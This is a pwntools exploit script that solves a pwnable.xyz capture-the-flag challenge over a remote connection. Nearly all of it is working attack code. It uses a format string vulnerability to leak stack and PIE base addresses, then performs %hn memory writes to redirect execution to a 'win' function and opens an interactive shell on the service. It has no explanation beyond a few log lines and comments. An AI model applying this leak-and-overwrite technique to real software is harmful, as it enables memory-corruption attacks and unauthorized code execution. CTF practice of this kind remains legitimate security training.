#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./challenge", checksec = False)

con = process()
# gdb.attach(con, gdbscript = '''
#            pie b 0x973 
#            pie b 0x09fc
#            ''')
con = remote("svc.pwnable.xyz", 30010)

def quit():
    con.sendlineafter(b"> ", b"0")

def edit_name(msg):
    con.sendlineafter(b"> ", b"1")
    con.sendlineafter(b"Name: ", msg)

def prep_msg():
    con.sendlineafter(b"> ", b"2")
    con.recvuntil(b"0x")
    return int(con.recvline().decode().strip("\n"), 16)

input()
### Stack leak
con.sendlineafter(b"Name: ", b"A"*25 + b"%10$p")
stack_leak = prep_msg()
ebp = stack_leak - 0x10

log.info("Stack base: " + hex(stack_leak - 0x1fea8))

### Pie leak
edit_name(b"A"*25 + b"%9$p")
pie_leak = prep_msg()
pie_base = pie_leak - 0x1fa0
cmd = pie_base + 0x2040
win = pie_base + 0x9fd

log.info("Pie base: " + hex(pie_base))

### Extend format string
edit_name(b"A"*25 + b"B%6$hn")
con.sendlineafter(b"> ", str((cmd & 0xffffff00) + 2))
for i in range(0x26, 0x30):
    con.sendlineafter(b"> ", str(cmd + i))

### Win
con.sendlineafter(b"> ", str((cmd & 0xffffff00) + 1))
con.sendlineafter(b"Name: ", f"%{(win&0xffff)-11}c%6$hn\0")
con.sendlineafter(b"> ", str(ebp + 4 - 0x100000000)) #số bù 2
quit()

con.interactive()
